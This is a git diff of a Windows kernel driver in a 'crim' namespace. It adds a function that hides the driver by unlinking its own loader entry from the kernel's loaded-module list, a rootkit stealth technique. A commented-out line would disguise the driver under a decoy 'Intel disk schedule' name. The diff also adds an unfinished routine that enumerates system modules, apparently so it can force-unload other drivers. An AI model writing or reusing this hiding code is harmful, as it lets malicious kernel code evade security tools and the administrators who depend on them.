@@ -49,18 +49,71 @@ void crim::WalkDrivers() {
 	return;
 }
 
-void crim::HideDriver(DRIVER_OBJECT *driver) {
-	DbgPrint("[crim::HideDriver] DRIVER_OBJECT %p\n", driver);
-	DbgPrint("[crim::HideDriver] driver->DriverUnload %p - DriverUnload %p\n", driver->DriverUnload, DriverUnload);
+void crim::HideDriverSelf(DRIVER_OBJECT *driver) {
+	KIRQL oldIrql = KeRaiseIrqlToDpcLevel(); // prevent interupts
+
 	if (driver->DriverUnload != DriverUnload) {
-		DbgPrint("[crim::HideDriver] Wrong driver\n");
+		DbgPrint("[crim::HideDriver] Warning driver object not self - unless first call will be ignored\n");
 	}
 
-	UNICODE_STRING name;
-	RtlInitUnicodeString(&name, L"");
-	driver->DriverName = name;
-	RtlFreeUnicodeString(&name);
+	// https://github.com/nbqofficial/HideDriver/blob/master/Driver.c
+	static auto hidden = false;
+	// get and save neighbouring nodes
+	static auto selfEntry = (nt::PLDR_DATA_TABLE_ENTRY)driver->DriverSection;
+	static auto prevEntry = (nt::PLDR_DATA_TABLE_ENTRY)selfEntry->InLoadOrderLinks.Blink;
+	static auto nextEntry = (nt::PLDR_DATA_TABLE_ENTRY)selfEntry->InLoadOrderLinks.Flink;
 
-	// TODO: Remove self from driver linked list, see https://github.com/nbqofficial/HideDriver/blob/master/Driver.c
+	if (!hidden) {
+		DbgPrint("[crim::HideDriver] Hiding driver %p\n", driver);
+		//UNICODE_STRING name;
+		//RtlInitUnicodeString(&name, L"Intel disk schedule");
+		//driver->DriverName = name;
+
+		// remove ourselfs
+		prevEntry->InLoadOrderLinks.Flink = selfEntry->InLoadOrderLinks.Flink;
+		nextEntry->InLoadOrderLinks.Blink = selfEntry->InLoadOrderLinks.Blink;
+
+		// wrap our linked list with ourself
+		selfEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)selfEntry;
+		selfEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)selfEntry;
+	} else {
+		DbgPrint("[crim::HideDriver] Unhiding driver %p\n", driver);
+
+		prevEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)selfEntry;
+		nextEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)selfEntry;
+
+		selfEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)nextEntry;
+		selfEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)prevEntry;
+	}
+
+	// toggle hiddens status
+	hidden = !hidden;
+
+	KeLowerIrql(oldIrql);
 	return;
+}
+
+NTSTATUS crim::ForceUnloadDriver(char name[]) {
+	// TODO: piss-taker, code breaker
+
+	auto modules = new(NonPagedPoolNx) nt::RTL_PROCESS_MODULES;
+	ULONG retlen;
+
+	auto status = nt::ZwQuerySystemInformation(nt::SystemModuleInformation, modules, sizeof(*modules), &retlen);
+	if (!NT_SUCCESS(status)) {
+		DbgPrint("[crim::WalkDrivers] ZwQuerySystemInformation(SystemModuleInformation...) failed with code %x\n", status);
+		return -1; // TODO: find error code
+	}
+
+	auto nameLen = strlen(name);
+	for (auto i = 0; i < modules->NumberOfModules; i++) {
+		if (strncmp(modules->Modules->FullPathName + modules->Modules->OffsetToFileName, name, nameLen)) {
+			// matched the driver
+			// find it's DriverUnload() function
+		}
+	}
+
+	delete modules;
+
+	return STATUS_SUCCESS;
 }
